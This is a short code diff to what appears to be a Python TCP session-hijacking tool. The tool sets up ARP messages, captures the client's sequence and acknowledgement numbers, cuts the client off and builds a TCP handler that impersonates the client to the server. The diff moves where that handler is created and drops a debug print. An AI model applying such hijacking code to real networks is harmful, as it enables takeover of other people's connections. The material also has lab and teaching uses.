@@ -120,7 +120,7 @@ arp_msg_server = eth.ArpMessage(arp_data_server)
 eth_handler = eth.EthernetHandler(if_name, local_mac=my_mac, remote_mac=client_mac, block=0)
 hijacked = False
 
-tcp_handler = tcp.TCPHandler(if_name, client_port, server_ip)
+tcp_handler = None
 ch = chr(0)
 
 # configure terminal and start
@@ -167,7 +167,6 @@ try:
                     print_seg(tcp_seg)
                     if all(hijack_filter):
                         client_port = tcp_seg.src_port
-                        print(f'new client port: {client_port}')
                         seq_nr = tcp_seg.seq_nr
                         ack_nr = tcp_seg.ack_nr
                 if frame.src_addr == server_mac and ip_pk.dst_addr != my_ip:
@@ -188,8 +187,8 @@ try:
                     cut_off_client(if_name, client_ip, server_ip, client_port,
                             server_port, seq_nr, ack_nr)
                     # prepare TCP parameters and handler
+                    tcp_handler = tcp.TCPHandler(if_name, client_port, server_ip)
                     tcp_handler.remote_port = server_port
-                    tcp_handler.local_port = client_port
                     tcp_handler.local_ip = client_ip
                     tcp_handler._rcv_nxt = ack_nr
                     tcp_handler._snd_nxt = seq_nr
